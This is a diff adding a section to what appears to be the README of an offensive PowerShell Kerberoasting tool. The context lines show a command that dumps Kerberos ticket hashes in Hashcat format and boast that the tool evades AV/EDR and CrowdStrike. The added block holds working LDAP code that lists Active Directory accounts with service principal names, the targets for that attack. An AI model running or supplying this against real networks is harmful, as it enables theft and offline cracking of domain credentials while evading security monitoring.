@@ -20,3 +20,34 @@ Invoke-Kerby -OutputFormat Hashcat | % { $_.Hash }
 
 >[!TIP]
 > Undetected on AV/EDR. No AMSI bypass required. Tested against CrowdStrike.
+
+<details>
+In case you need to enumerate SPNs first:
+  
+````
+$domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
+$root = "LDAP://" + $domain.Name
+$searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$root)
+
+$searcher.Filter = "(&(objectCategory=person)(servicePrincipalName=*))"
+$searcher.PageSize = 500
+$searcher.PropertiesToLoad.Add("samaccountname")     | Out-Null
+$searcher.PropertiesToLoad.Add("servicePrincipalName") | Out-Null
+$searcher.PropertiesToLoad.Add("distinguishedName")  | Out-Null
+
+$searcher.FindAll() | ForEach-Object {
+    $user = $_.Properties["samaccountname"][0]
+    $dn = $_.Properties["distinguishedname"][0]
+    $spns = $_.Properties["servicePrincipalName"]
+
+    foreach ($spn in $spns) {
+        [pscustomobject]@{
+            User = $user
+            SPN  = $spn
+            DN   = $dn
+        }
+    }
+}
+````
+
+</details>
